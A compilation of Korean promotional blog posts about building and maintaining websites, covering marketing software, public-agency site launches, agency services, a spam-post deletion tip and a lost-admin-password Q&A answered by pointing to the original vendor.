영업을 함에 있어서 신경써야할 부분이 정말 많죠? 디비쉐어2.0 프로그램이 여러분의 사업파트너로 그 옆을 든든히 지켜드리겠습니다.    지인을 통해 홍보하는 단순한 방식의 영업을 해와서 한계를 느끼신분, 요즘 트렌드를 파악하지 못하고 뒤쳐져서 소비자들의 눈길을 끌지 못하는 분, 영업과 마케팅 비용을 최소화 하면서도 매출효과를 크게 내고싶으신분, 체계적인 플랜과 계획으로 쓸데없는 시간낭비 없이 근무시간을 탄력있게 만들고 싶으신분, 효율성있는 영업을 원하시는분, 이전과는 다른 방법으로 마케팅을 진행하고 싶으신분들은 온라인 영업을 디비쉐어와 함께 해보세요! 학원홈페이지관리, 학원마케팅, 병원홈페이지관리, 화장품마케팅, 개인사업, 공동사업 등 다양한 분야를 관리해드리고 있습니다. 디비쉐어 또한 많은 사업주들과 마케트들의 의견을 종합하여 제작된 확장형 CAP솔루션 입니다 기본의 디비쉐어 1.0 프로그램보다 한단계 더 발전하고 더 큰 도움이 되어드리기 위해 새로운 기능을 도입하였습니다. 호평을 기반으로 하여 필요한 요소들만 뽑아내고 재구성하여 이전보다 좀더 철저한 분석이 가능합니다. ​ 디비쉐어의 다양한 기능은 무엇일까? DB관리를 위한 별도의 마이페이지를 제공해드리며 엑셀다운로드, 엑셀 업로드 기능 등 마케팅에 있어서 필요한 부분들을 디비쉐어2.0이 도와드리고 있습니다. 마케팅설정과 마케팅플랜에 있어서 방향성을 설정해드리고 설계해드리고 있습니다. 마이페이지에서는 이전에 말씀드렸던 영업자실적관리, 정산기능, DB추적시스템, 영업자 코드 발급시스템, 영업자별 URL 자동생성, 관리자 1대1상담 알림톡등의 기능을 이용하실수 있습니다. 이렇게 하나하나 체크하시며 사업을 성장시킬수 있으십니다. DB유입과 상태, 히스토리기능까지 파악하시면서 효과적으로 접근가능합니다. ​디지털세대인 만큼 온라인 영업은 필수로 자리잡았습니다. 늘어나는 소비자들과 튼실한 고객관리와 함께 영업을 새로운마음과 플랜으로 다시 시작해보세요! 한단계 발전한 영업체계로 눈에띄게 달라진 결과를 보실수 있으십니다. ​카카오톡 플러스 친구를 통해서 디비쉐어와 더 자세히 상담을 하시고 결정해보세요! 플러스친구에 디비쉐어를 검색하셔서 문의하시면 된답니다. 혹여나 이런적이 처음이라 망설이시는 영업자분들이 계시다면 가벼운 마음으로 상담을 진행해보세요. 좀더 나은 영업과 마케팅을 위해서 새로운 시도를 하실때입니다!              ​ 안녕하세요. 혈액관리본부입니다.이용자들이 사용하기 쉽고 편리하게대한적십자사 혈액관리본부 홈페이지가새롭게 변했습니다! 어떤 모습으로 변했을지너무 궁금한데요! 얼른 알아볼까요?  혈액관리본부 홈페이지에새로운 디자인의 메인페이지와모바일에서도 편리한 반응형 웹이 적용되었습니다.​오늘부터 새롭게 적용된 홈페이지를 만나보실 수 있습니다. 주요 변경사항은 다음과 같습니다.​1) 주요 서비스를 빠르고 편리하게 찾을 수 있도록 했습니다.2) 텍스트 위주였던 기존의 메인페이지에서아이콘과 이미지 위주의 깔끔한 디자인으로 개선했습니다.3) 반응형 웹 전환에 따라 스크린 환경에 관계없이최적화된 화면을 만날 수 있습니다.※ 실제 운영 상황에 따라 디자인, 레이아웃은 변경될 수 있습니다. 위 이미지처럼 적용된 화면을 볼 수 있는데요.반응형 웹으로 모바일에서도 홈페이지를이전보다 더 편하게 이용하실 수 있습니다. 그리고 헌혈자 분들이 많이 찾는 서비스들을모아 놓은 '주요 서비스' 디자인을 개선했습니다.​① 이미지 위주의 아이콘을 배치해더욱 쉽고 빠르게 주요 서비스를 찾을 수 있습니다. ② 헌혈자 분들이 가장 많이 찾는 서비스만우선적으로 배치하여 편리성을 더했습니다. 새로운 디자인에 이전보다 더 편리해진혈액관리본부 홈페이지에 많이 방문해주시기를 바라며앞으로도 헌혈자 분들을 위해서 노력하겠습니다.감사합니다. ​ 함양군 대형폐기물 신고관리 시스템 홈페이지 제작함양군 대형폐기물 신고관리 시스템 홈페이지를 제작하여 2021년 7월에 오픈하였습니다.(주)아이액츠함양군 대형폐기물 신고관리 시스템 홈페이지 반응형 구축 화면함양군 대형폐기물 신고관리 시스템 홈페이지는대형폐기물 배출을 위해 기존 읍면사무소를 방문하던 방법에서,편리하게 인터넷을 통한 폐기물 배출이 가능하도록홈페이지 제작을 진행하였습니다.​​ 함양군 대형폐기물 신고관리 시스템 홈페이지 메인/서브 화면 함양군 대형폐기물 신고관리 시스템 홈페이지는대형폐기물 배출의 인터넷을 통한 신청 및 배출방법과 공지사항,배출 가능 폐기물 품목 및 수수료에 관한 정보를 안내하고 있습니다.신청부터 결제 및 처리확인까지 쉽게 이용이 가능한 서비스를 제공하는 홈페이지를 구축하였습니다.​​ Previous imageNext image함양군 대형폐기물 신고관리 시스템 홈페이지 모바일 버전 화면 반응형 홈페이지 구축을 통해  다양한 모바일 기기(스마트폰, 태블릿 등)에서도  언제 어디서나 쉽게 사용할 수 있도록 구축하였습니다. 함양군 대형폐기물 신고관리 시스템 홈페이지를 살펴보시려면.​ 함양군 대형폐기물 신고관리 시스템 홈페이지 바로가기https://www.hygn.go.kr/waste.web 함양군청경상남도 함양군 함양읍 고운로 35 ​ (주)아이액츠행정/공공기관 홈페이지 및 SW 개발아이액츠와 함께!​ #부산홈페이지구축 #부산홈페이지제작 #경남홈페이지구축 #경남홈페이지제작 #함양군대형폐기물신고관리시스템홈페이지구축 #함양군대형폐기물신고관리시스템홈페이지제작​#함양대형폐기물신고관리시스템홈페이지구축 #함양대형폐기물신고관리시스템홈페이지제작 #아이액츠 #웹사이트구축 #행정기관 #공공기관 #함양군대형폐기물신고관리 #함양대형폐기물신고관리 안녕하세요 비전테크입니다!오늘은 공공기관을 위한 홈페이지 관리 방법에 대해 알려드리려고 합니다.공공기관에서는 홈페이지뿐만 아니라요즘에는 홍보를 위해서 블로그, 페이스북, 인스타그램, 유튜브 등등 많은 사이트를 개설하는 모습이 보이는데요!​ 공공기관 홈페이지 관리 잘 하고 계시나요?​공공기관에서는 직접 내부에서 관리하는 곳도 있지만많은 인원이 관리하는 것이 아니기 때문에초기에 관리하던 페이지는 유령 사이트가 되는 경우가 많습니다.또한 트렌드에 맞는 홍보수단을 위해 사이트만 개설하고 지속적인 유지관리는 잘되지 않고 있는데요.​ 가장 중요한 홈페이지를 보면상시 수정이 필요한 공지사항, 운영 일정, 실적 사항 등 게시물을 업로드하고매년 수정이 필요한 기관의 목표와 내부 사항 등 이미지, 텍스트를 수정하는 작업이 필요합니다.또한 노후된 사이트는 디자인을 업데이트해주는 작업을 해줘야 하는데요.컴퓨터 프로그래밍에 능숙한 전문가가 아니면 홈페이지는 관리하기 굉장히 힘듭니다.​ 중간에 오류사항이 나타날 경우를 대비해서 계속해서 홈페이지를 모니터링할 수도 있어야 하지만회사 내에 상시 관리할 수 있는 인력을 배치하는 경우는 드문 일이죠.그래서 대부분 기관에서는 홈페이지 유지관리 업체에게 담당하도록 하고 있습니다.상시 게시글과 이미지 업데이트가 가능하고 오류를 범하지 않는 상태로 유지관리가 가능하기 때문이죠!​ 여기에 더해서 홈페이지뿐만 아니라 페이스북, 인스타그램 등 홍보 페이지를 추가적으로 관리하기 위해서도대행업체를 통해 관리해 주는 것이 좋습니다게시글을 업로드하기 위한 배너, 카드 뉴스 등의 이미지 작업도 가능하고많은 사람들에게 홍보하기 위해 필요한 키워드 파악, 해시태그 입력 등이 가능하도록 하기 위해서는홍보 전문가의 노련한 기획력이 들어가 줘야 하는데요.​ 가장 중요한 건 지속적인 관리입니다.공공기관에서 홍보를 담당하는 소수의 인원으로는 여러 페이지의 게시물을 생성하고 업로드, 홍보하는 일은 굉장히 힘듭니다. 실제로 제대로 된 홍보는 이루지지 않는 경우가 많은데요. ​ 비전테크에서는 고퀄리티의 이미지 제작뿐만 아니라 대중들에게 많이 홍보 될 수 있는 기획력을 가지고 접근하고 있습니다. 기관에서 원하는 이미지와 추구하는 목표를 상담을 통해 파악하고 수시로 상담하고 기획해서 홍보도 진행하고 있는데요.비전테크에서는 합리적인 가격으로 다양한 홍보수단을 관리·담당하고 있습니다.​자세한 내용은 홈페이지를 참고해 주세요.카카오톡으로 간편 상담도 가능합니다!​비전테크 카카오톡 채널 : http://pf.kakao.com/_twHJK   ​ 홈페이지는 인터넷상에서 나의집과 같은 역활을 하기 때문에 중요합니다. 하지만 제작만 한다고 끝이 아니죠. 제작을 했다면 꾸준한 유지 관리가 필요합니다.​홍보할 내용을 꾸준히 홈페이지에 업데이트와 소스, 오류, 팝업 등 관리가 필요하죠.홈페이지를 관리하지 않고 그대로 방치할 경우 홈페이지상에 생긴 오류, 내용 업데이트가 되지 않아 관리되지 않은 홈페이지라는 인상을 남길 수 있습니다.​ 팝업으로 메인을 보기 어려운 홈페이지​홈페이지를 제작 한 후에도 시기별로 알려야 하는 홍보 내용과 유지 보수관리가 필요합니다.거의 대부분 회사나 병원에서는 유지 보수 전문관리자가 없다 보니 메인 페이지를 보완 수정을 못해서 팝업으로만 알리는데 사용자 입장에서는 수많은 팝업으로 중요 내용을 볼 수가 없습니다.​팝업은  짧은 기간 긴급하게 알리는 창으로 활용하고중요한 내용들은 메인으로 넣어 사용자 입장에서 정리를 해주면 좋습니다.  어린이병원 홈페이지 메인 컨텐츠 기획 디자인 병원 홈페이지 디자인 제작병원 홈페이지 메인 롤링 기획 및 디자인비대면 진료 서비스AI 성장판 검사생활 화상 치료​홈페이지 유지 보수 관리는 전문가가 필요합니다.​(1) 운영 유지 관리회원관리나 게시판 글쓰기 및 답변 관리, 팝업 관리 등을 말합니다.​(2) 디자인 유지관리홈페이지 내 이미지 변경, 서브 페이지를 추가 수정, 팝업 이미지 등디자인 유지 보수가 필요합니다.​(3) 기술과 서버 유지관리홈페이지 기능 관련해서 기술적인 면과호스팅 서버의 안정적인 연결 및 접속 관리​홈페이지 기획 제작뿐만 아니라 유지 보수도 진행하고 있습니다 홈페이지 관리 언제든 편하게 문의하세요.​ 브랜드를 더 가치 있게 - 브링유 | 상담문의 010-4983-1979​ 안녕하세요.광고 마케팅에 대한 중요성이 커지는 가운데광고시장이 커짐에 따라 홈페이지제작 및 홈페이관리 또한많은 심을 끌고 있습니다.시시각각 변하는 다양한 광고 시장 안에서 살아남기 위해서는 매체 및 광고에 대한 이해와 다양한 노하우를 바탕으로고객사와의 동반 성장을 지향하는 온라인 광고 전문 기업, 광고대행사와 진행해야 합니다. 온라인 광고대행사 위드마케터스는진심을 담은 광고 기획과 제안을 진행하며전문컨설턴트와의 1:1 커뮤니케이션을 통한효율적인 광고 집행과 체계적인 성과를 분석합니다.꾸준히 성장을 할 수 있었던 이유는그동안 쌓은 데이터와 수많은 노하우를 바탕으로다른 대행사와 차별화된 관리와 서비스를 제공하기 때문입니다.홈페이지 제작을 해주는 대행사들은 많겠지만위드마케터스에서는 홈페이지관리 또한 신경쓰며 관리를 도와드립니다.홈페이지관리는 정말 중요합니다. © austindistel, 출처 Unsplash제작에도 중점을 두며 홈페이지를 만들지만관리 또한 소홀하지 않습니다.홈페이지 방문을 하는 다양한 경로를 파악하고 분석하며 홈페이지를 통해 다양한 콘텐츠와 정보들을 제공함으로써 다음에도 재방문을 할 수 있도록맞춤형 정보 및 관리를 제공합니다. 다양한 고객층에 맞는 관리를 수렴함으로써 재방문하게 만들고 더 나아가 광고까지 진행할 수 있습니다. © austindistel, 출처 Unsplash온라인 광고대행사 위드마케터스에서는 홈페이지 제작 및 관리 모두 지역 관계없이 누구나 가능하며홈페이지 제작에 필요한 모든 것들을1:1 컨설턴트를 통해서 사장님과 함께 진행합니다.보다 효율적인 운영을 위해서는업종에 맞는 홈페이지를 제작했는지업종에 맞는 홈페이지관리를 하고 계신지광고 소재에 따른 내용이 매력적인지 등등다양한 시각에서 파악을 하며 진행해야 합니다.​위드마케터스에서는 다양한 분야의 전문적인 직원분들이 계십니다.잘알고 잘하는 직원분들이 계시기에광고 및 홈페이지 관리에 대해서도문제없이 성장하실 수 있도록위드마케터스는 최선을 다해 도와드리고 있습니다. © drew_beamer, 출처 Unsplash성공적인 비지니스를 위해서포털사이트를 통해 노출되는 온라인 광고의 기본인 검색광고와포털사이트 및 다양한 제휴 사이트의 PC 및 모바일 메인, 세부페이지 영역을 통한 노출이 가능한 디스플레이광고도 진행하고 있습니다.홈페이지관리를 위해서는 다양한 각종 포털사이트 또는제휴 매체사의 지정된 여역에 노출시키며시각적인 광고 소재를 통해 많은 잠재된 타겟 고객들에게노출시킴으로써 더욱더 단기간에 효율적인 홈페이지 관리 및 운영이 가능합니다. © imattsmart, 출처 Unsplash매체별 노하우를 보유한 실력있는 광고대행사 위드마케터스와협력함으로써 브랜드 성장을 기대해야 합니다.세부적인 타겟팅을 통한 효율적인 광고 운영과홈페이지제작 및 홈페이지관리를 통해서광고 효율을 높일 수 있도록 도와드리겠습니다.감사합니다.​[실시간 채팅 문의] 위드마케터스카카오톡 채팅을 해보세요.pf.kakao.com [상담 신청서 작성] ​ 홈페이지에 게시판을 열어두면 간혹 이렇게 악성 스팸 글이 달릴 때가 있다.매일 관리한다면 그때그때 지우면 그만인데, 말 그대로 악성인 경우 한꺼번에 여러 게시물을 남기기도 하고며칠 신경 안 쓰면 몇 페이지씩 도배가 되어버린다.​아임웹 홈페이지든, 유어웹 홈페이지든 사실 어느 솔루션으로 만들었든 매한가지.​ 특정 사이트를 홍보하는 경우도 있지만의미 없는 '뿘쀇뽏뿕' 같은 텍스트거나 아니면 온갖 링크들로 그득하기도 하다.​하나씩 지워나가면 끝도 없으니 관리자 모드로 진입.​ [컨텐츠 관리]에서 [게시물 관리]를 누르면 우측에서 해당 게시판을 찾아지우고자 하는 게시물을 한꺼번에 선택하고 우측 상단에서 <게시물 삭제>를 누르면 끝.​게시판을 운영자만 작성할 수 있게 하려면 [디자인 모드]로 들어가야 한다.​ [디자인 모드]에서 해당 게시판을 찾아 본문 영역에서 우클릭한 다음 [게시판 설정]으로 들어가중간에 <권한>을 설정할 수 있다.여기서 게시판 접근부터 읽기, 쓰기, 댓글까지 각각 권한을 따로 부여할 수 있다.​​ 아임웹 홈페이지 관련 다른 팁[아임웹 솔루션 사용팁] 상세 페이지 원하는 부분으로 링크 걸기가끔.나도 동생처럼 프로그램을 배웠으면 어땠을까 싶을 때가 있다.잘 할 자신 있는데.​페이지 소스 보면 ...blog.naver.com ​ ​질문홈페이지 관리​홈페이지를 관리하는 비밀번호를 잃어버렸습니다​관리하던 사람이 없어져서 비밀번호를 바꿀 수 있는 방법이 없습니다​이를 해킹한다거나 해서 홈페이지를 관리하는 비밀번호를 찾을 수 있는 방법이 없을까요​​답변안녕하세요! 홈페이지 관리에 대해 질문해 주셨군요~​홈페이지를 관리하기 위해서는 기본적인 정보가 필요합니다.​보통 홈페이지 관리자 계정과 호스팅 서버, 도메인 구입 정보 등이 필요합니다.​만일 홈페이지를 초기 제작해 준 업체를 알고 계시다면 업체에 연락해 도움을 요청하세요.​관리자 계정 대신 호스팅 정보를 알고 계시다면 서버에 접속하여 관리자 계정 변경이 가능합니다.​홈페이지 관리가 제대로 안 되어 있다면 기업의 이미지에 부정적인 영향을 끼칩니다.​별도의 홈페이지 관리가 필요하시다면 경험 많은 전문 업체와 상담해보세요.​홈페이지 관리 업체를 선정하실 땐 업력이 탄탄한, 포트폴리오를 공개하고 있는 곳은 어떨까요?​홈페이지에 수정할 내용이 있으시거나, 홈페이지 관리에 대해 자세히 궁금하신 점은 '에이디커뮤니케이션'으로 연락 주세요. :)​홈페이지 관리자 비밀번호 찾는 방법에 대해 알려드리겠습니다.​감사합니다.​  http://www.adcomm.kr 에이디커뮤니케이션홈페이지제작,반응형홈페이지제작,쇼핑몰제작,모바일홈페이지제작,홈페이지디자인,기업홈페이지제작,홈페이지수정,각종 솔루션 제작,인천홈페이지제작 전문업체.www.adcomm.kr 떡을 보기 좋게 만들어주는 홈페이지 관리업체​​최근 많은 창업자들이 자신만의 홈페이지를 만들려고 합니다.아무래도 소자본 창업자들이 사업을 시작할 때 가장 좋은 방법은본인 기업의 홈페이지를 ​제대로 만들어서 예비 소비자들에게 보여주는 것이겠죠?​​ ​​특히 코로나19 감염자가 점점 늘어나는 추세인 요즘,오프라인 콘텐츠들 보다는 온라인 콘텐츠들이 많이 나오고 있습니다.게다가 최근 오프라인 콘텐츠도 온라인 콘텐츠로 대체되는 경우가 많습니다.​​ ​​이러한 현실 속에서 자체 홈페이지가 없다면뛰어난 제품도, 기발한 콘텐츠도, 소비자들에게 선보이기 쉽지 않습니다.그렇기 때문에 요즘들어 홈페이지의 중요성이 점점 크게 다가옵니다.​​ ​​홈페이지, 만드는 것도 쉽지 않지만 일정수의 방문자를유지하는 것도 꽤 힘이 많이 드는 것이 현실입니다.사실 노하우가 없다면 홈페이지 관리가 매우 어렵습니다.​​ ​​대부분의 창업자들은 이러한 상황이 낯설기만 할 것입니다.그리고 난감해 하며 발만 동동 구르고 있는 경우가 많습니다.그러다가 홈페이지 관리업체를 찾게 되는 경우가 많은데요,모든 홈페이지 관리업체가 그런 것은 아니지만,홈페이지 관리업체를 이용해도 기대보다 효과가 낮은 경우가 종종 있습니다.​​ ​​그러한 경험을 하신 분들을 위해제이와이네트워크가 홈페이지 관리업체를 자처하고 나섰습니다.비록 저희가 홈페이지 관리업체를 자처하고 나섰지만제이와이네트워크에서는 홈페이지의 시작이라고 할 수 있는홈페이지 디자인부터 관리, 그리고 홍보까지 할 수 있습니다.​​ ​​그리고 여기서 멈추지 않고 창업의 모든 부분을 도와주는‘성공창업 디자인 패키지’라는 상품도 있는데요이 상품은 로고, 전단지, X배너 등 디자인 상품을 한번에 만날 수 있습니다.​​ ​​‘성공창업 디자인 패키지’는 여기서 멈추지 않고홈페이지 디자인까지 함께하게 되는데요,저희가 홈페이지 관리업체를 자청한 만큼뛰어난 퀄리티의 홈페이지 디자인을 만들어 드립니다.​​ ​​제이와이네트워크는 홈페이지 관리업체일 뿐만 아니라다양한 형태의 마케팅 콘텐츠 제작이 가능한 기업으로,각 분야의 전문 디자이너로 구성된 경험 많은 디자인팀,필요한 경우 영상으로 홍보가 가능한 영상팀,다양한 스토리를 구상할 수 있는 ​작가팀이 함께 하고 있습니다.​​  ​ 안녕하세요~ 온맘지기입니다 :) 본격적인 장마철입니다~남부지방의 폭우피해와 수도권의 코로나 유행 상황을 놓고 잠시 두손모아 기도합니다... ​온맘닷컴은늘 회원교회와 성도님들, 한국교회를 생각하고 있어요.. 장마피해와 코로나 확산으로 성경학교, 수련회 준비에 박차를 가하고 있을 많은 분들이.. 적지않게  속상하실 것 같아요...  ​그래도 포기할 순 없습니다..! 우리에게 주신 섬김의 자리를 뚜벅뚜벅 걸어가야겠지요??   ​화이팅!!! ​온맘지기는 당장 어려움을 맞이한 회원교회와 성도님들을 위해 어떤 도움을 줄 수 있을까 고민했어요.. ​혹시 지난 4월달에 올린 포스팅을 기억하실까 모르겠어요..바로.. ​[엄마같은 서비스!!] 두둥 ​  [교회 홈페이지 제작] 엄마같은 서비스안녕하세요~ 온맘지기 입니다 :) 출근길에 오르며 오늘 아침은 유독 배가 너무 고팠습니다 흐헝.. 환승역 ...blog.naver.com 말하지 않아도, 필요한 것들을 챙겨주셨던 엄마의 마음으로 홈페이지를 관리하는 온맘닷컴을 소개해드렸었죵...​장마피해와 코로나 확산으로 여름사역준비에 어려움을 겪고 계실 회원교회와 성도님들을 위해 온맘이 준비했습니다!! ​​ ​두둥~~!!!!!! 무료슬라이드 이벤트!!!?   ​슬라이드 이벤트가 뭔지 궁금하시지요? ​자~ 쉽게 설명해서~ 여러분들 교회 대예배실(본당)에 절기와 행사때마다 현수막이나 스크린 화면을 준비하시잖아요?  [ 절기에  맞춰 현수막을 안걸면 목사님께 혼났던 기억이... 흐헝.. ) ​교회 홈페이지도 마찬가지입니다.. 대예배실에 현수막이 걸리듯, 홈페이지에도 현수막이 걸려야겠지요?​[ 교회 현수막 = 교회 홈페이지 슬라이드 ] ​​보다 빠른 이해를 위해 예시화면을 보여드릴게요!! ​​ < 맥추절 & 부활절> <사순절 & 추수감사절>       <성탄절 & 송구영신예배> 절기마다 다양한 디자인의 슬라이드로 옷을 갈아입을 수 있겠네요! 와우~~   ​이 모든 슬라이드가 온맘닷컴에서 서비스(무료)로 제공된다는 것, 아셨나요?? :) 온맘은 말로만 한국교회와 동역하지 않습니다..!!! ​다사다난한 2021년 여름,장마와 코로나 확산으로 걱정이 많은 2021년 여름을 맞이하여 온맘닷컴이 무료 슬라이드를 준비했어요~~ :) ​[샘플슬라이드]  ​산뜻한 디자인이지 않나요?? 올 여름 각 교회의 여름성경학교, 수련회, 부흥회을 통해 산뜻하게 불어오는 성령의 바람을 모두가 누릴 수 있길 온맘도 기도합니다!!​포스팅을 쓰고 있는 지금도 아주 부리나케(??) 작업중에 있습니다.. ^^;; 많이들 신청해주시고 계세요..... (손은 아프지만 괜찮습니당....)   ​​   ​ ​와우... 온맘닷컴의 서비스, 유지관리를 직접 살펴보시니 어떠신가요?교회홈페이지 운영~ 온맘닷컴과 함께라면~ 어렵지 않습니다. ^^ ​오늘도 여름사역 준비로고군분투하고 계실 목사님, 전도사님, 간사님, 부장집(권)사님, 교사, 청년, 스텝, 찬양팀 등등 온맘지기도, 온맘의 자리에서 응원하겠습니다 :) ​교회 홈페이지는 온맘닷컴교회 홈페이지 사후관리도 온맘닷컴변함없는 교회 홈페이지 서비스는 단연 온맘닷컴한국교회의 동역자는 역시 온맘닷컴입니다~ ​자세한 홈페이지 문의나 상담은 ​1. 아래의 신청하기 설문을 작성해주세요.  온맘닷컴 신규홈페이지 신청하기서비스종류 * 교회 기관 개인 기타 홈페이지명 * Your answer 담임목사 혹은 대표자 * Your answer 원하시는 홈피 URL를 작성해주세요. * http:// [ 원하시는 홈피 URL ]. onmam.com Your answer 신청자 전화번호를 입력해주세요. * Your answer 유선 상담이 가능한 시간을 알려주세요. Your answerdocs.google.com ​2. - 온맘고객센터 : 02-6462-0201 ​- 카카오톡 & 문자상담 : 010-2850-0201 (온맘닷컴)​- 이메일문의: cs@onman.com  ​​연락주세요~~ ^^ ​ 온맘닷컴 홈피 - 교회홈페이지 10년의 노하우교회홈페이지와 모바일웹을 제작비 없이 웹호스팅으로 이용가능, 도메인, 맞춤디자인, 어플, 팟캐스트 등 유료지원home.onmam.com ​​​​​ 2020년도 홈페이지 관리 회사의 사정으로, 본 법인의 홈페이지가 임시 폐쇄되어 재개설 준비중입니다.하여 공익위반사항 관리ㆍ감독기관이 개설한 인터넷 홈페이지와 연결해야하는 조항으로 인해 블로그를 임시 대체 운영합니다.감사합니다.​ 국민신문고국민권익위원회가 운영하는 온라인 국민참여포털로 민원신청, 국민제안, 정책참여 창구www.epeople.go.kr 국세청국세청www.nts.go.kr 「반부패 총괄기관」 국민권익위원회국민권익위원회 주요기능 부패방지 신고자보호 고충처리 행정심판 제도개선 국민소통www.acrc.go.kr 김해시청공지사항 사회적 거리두기 2단계 시행 : 7. 14 ~ 7. 27 080 안심콜 서비스 신청하기 바로가기 김해시 코로나 19 상황알림 바로가기 김해시 대표 홈페이지 바로가기www.gimhae.go.kr ​​ 안녕하세요 펜션홈페이지제작업체 펜션사랑넷입니다. ^^​여름의 계절 7월 8월이 드디어 왔습니다!본격적인 여름 시즌을 준비하는 곳들은 년초에 리모델링 또는 부분 수리를 통해 펜션 손님을 맞을 준비를 하였고펜션의 위치적인 특성상 가을이 주요 시즌이 되는 펜션은 이제부터 서둘러 준비를 하셔야 하는 기간입니다.^^​펜션 홈페이지제작을 위해 준비 및 체크해야할 것들이 많이 있습니다. 먼저 제작가격도 따져봐야할테고 좋은 디자인으로 제작할 수 있는지 관리 기능은 좋은지 펜션 숙박 예약기능은 제공하는지 예약기능자체에 불편함은 없는지 회원관리 기능이 잘 되어 있는지 예약과정에 발생되는 문자 비용은 저렴한지  등등 수많은 것들을 생각하며 펜션홈페이지제작을 준비해야합니다​준비해야할 항목들이 너무 많다면 이 다양한 것들을 해결해 줄 수 있는 펜션홈페이지제작업체 펜션사랑넷에서 제작을 하면 한번에 해결이 됩니다.​먼저 트렌드를 파악하여 현재 고객이 원하는 인터페이스와 디자인을 가지고 한발 앞서 준비되어 있는 서비스를 제공합니다.너무 앞으로가지도 않고 뒤쳐지지도 않는 적절한 시스템 구성과 디자인으로 현재에 맞는 서비스를 준비하고 있습니다.그래서 PC와 태블릿 그리고 모바일 어떤 기기에서도 자유로운 홈페이지 서비스를 할 수 있는 반응형 구조의 홈페이지 제작을 진행하는 펜션사랑넷입니다.  펜션사랑넷은 20년 이상의 제작 경험을 가지고 좀 더 착한 제작비용과 착한 운영비로 서비스할 수 있는 시스템을 만들기 위해 노력해왔습니다.그 노력은 33만원의 거품없는 제작비와 월 22,000원의 합리적인 운영비를 통해 서비스하는 모습으로 현실화 하였습니다. 펜션홈페이지제작 후 운영에 대한 부분을 생각해본다면 한번 더 펜션사랑넷으로 결정 할 수 있는 이유가 됩니다.제작만 하고 관리가 제대로 이루어지지 않는 시스템이라면 반쪽 홈페이지라고 할 수 있겠죠!펜션사랑넷은 자유롭게 디자인과 컨텐츠를 수정할 수 있는 홈페이지 수정 시스템을 제공하기 때문에 누구나 쉽고 빠르고 간단하게! 홈페이지를 관리 운영할 수 있습니다.다양한 이벤트를 알릴 수 있는 팝업도 수많은 팝업 샘플중 원하는 팝업을 선택하고 간단한 텍스트 수정만으로 손쉽게 팝업을 만들 수 있습니다.  펜션홈페이지제작의 가장 큰 이유는 바로 숙박 예약이죠!펜션사랑넷은 펜션홈페이지제작시 펜션예약시스템이 기본으로 제공됩니다. 무통장결제가 가능한 실시간예약시스템을 제공하며 예약시스템을 통해 들어온 예약건에 대한 수수료가 없는 착한 펜션 실시간 예약 시스템입니다. :D예약현황과 매출현황 그리고 방막기 등 예약관련 각종 기능들로 펜션사랑넷 예약시스템으로 충분히 예약 관리가 가능합니다. 물론 여행 포털 실시간 예약 시스템을 연결하기도 합니다. 펜션사랑넷은 떠나요닷컴과 제휴되어 별도의 번거로운 과정 없이 빠르게 제휴진행을 도와드릴 수 있습니다.^^ 펜션 홈페이지에 중요한 또하나는 사진이죠! 퀄리티 있는 사진이야말로 펜션 홍보에 가장 큰 영향력을 가지고 있습니다. 펜션사랑넷은 펜션 주야간 촬영과 드론항공촬영까지 가능한 사진촬영작가를 섭외 하여 퀄리티있는 사진촬영을 도와드립니다. ^^ 아직도 고민중이신가요? 펜션홈페이지 제작을 합리적으로 진행하는 펜션사랑넷을 통해 후회없는 제작과 앞으로의 관리를 맡겨보시는것은 결코 후회 하지 않는 선택이 되실겁니다. ^^지금 바로 상담 진행해보세요 :) 펜션사랑넷펜션 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.pension-love.net ​ 안녕하세요. 민들레미디어입니다.최근에 제작완료된 홈페이지가 있는데요..  클라이언트 회사의 담당자분께서 저희 민들레미디어 사무실에 방문해주셨습니다.​ 방문해주신 분은 회사에서 대리님으로 계십니다. 대리님의 초상권을 보호해드리기 위하여 블러처리 하였습니다.^^ 오늘 방문목적은 만들어진 홈페이지를 지혜롭게 잘 관리하고 운영하기 위함으로 교육을 받으셨습니다.홈페이지는 초기 제작이 중요하지만, 관리하는것 역시 중요합니다.물론 민들레미디어에서 제작이 된 홈페이지는 민들레미디어에서 책임지고 관리를 해드리고 있지만, 이렇게 교육을 해드리는 이유는 클라이언트 회사의 담당자분들께서도 미디어에 대한 흐름과 그 안에서 홈페이지의 역할에 대해서 안내해드리기 때문입니다. 오늘 교육은 관리자페이지에서 아래와 같은 리스트로 교육이 진행되었습니다.- 관리자 페이지 활용방법- 사용자 목록 관리 노하우- 홈페이지내 콘텐츠 관리 방법- 포털사이트와 연계된 통계분석 방법- 홈페이지 환경설정 방법​이렇게 진행이 되었습니다. 민들레미디어는 미디어콘텐츠 전문회사입니다. 전문분야는 전문가에게~^^감사합니다.​#회사홈페이지제작 #회사홈페이지 #수원홈페이지제작 #용인홈페이지제작 #대전홈페이지제작 #대한민국홈페이지제작 #기업홈페이지제작 #민들레미디어 #민들레미디어스쿨 #미디어전문회사   ​작은 기업부터 큰 기업까지서로서로 업종은 달라도반드시 있는 것 한가지는 바로 홈 페 이 지이제는 컴퓨터는 물론이고스마트폰으로도 무엇이든 할 수 있는세상이 되었습니다. 웹홈페이지만으로는기업의 홍보를 하는 데에한계가 생기기 시작한거죠.태블릿과 모바일 모두적용이 가능한 반응형 웹디자인으로홈페이지를 제작하시는 것을적극 추천 드리고 있습니다.      ​홈페이지가 존재한다고 하지만홈페이지만 있을 뿐 실질적인문의나 유입고객이 생기지 않는다면그것 또한 문제가 됩니다.그러한 문제는 홈페이지만 잘 만들어놓는다고 해서 끝나는 것이 아닙니다. 잘 만들어 놓은 홈페이지를얼마나 잘 이용하는지,홈페이지를 통해 고객과의 소통이잘 이루어지고 있는지,지속적인 컨텐츠의 리뉴얼이제대로 돌아가고 있는지 등등이런 부분들까지 세심하게관리를 해줘야 잘 돌아가는 홈페이지다라고 할 수 있습니다.​   ​그런 부분에 있어서단순 홈페이지제작만 하는게 아니라관리까지 같이 해주는 홈페이지관리업체에맡기시는게 나중을 위해서라도더욱 편리하게 되겠죠. 거기에 홈페이지제작관리 경험까지풍부하다면 더욱 좋겠죠.다수의 홈페이지 제작을 해오면서쌓인 수년간의 노하우들로갑작스러운 사태가 벌어진다고 하더라도잘 처리할 수 있는 가능성이 높아지니까요!​그렇기 때문에 홈페이지관리업체를정하실 때는 신중하게 정하셔야 합니다.  ​   ​비용을 들여서 제작했는데이후에 소홀한 관리로 인해서껍데기만 멋질 뿐 쓸모 없는 홈페이지로전락해버리지 않도록다이앤디자인에서는홈페이지제작부터 관리까지꼼꼼하게 신경 써서 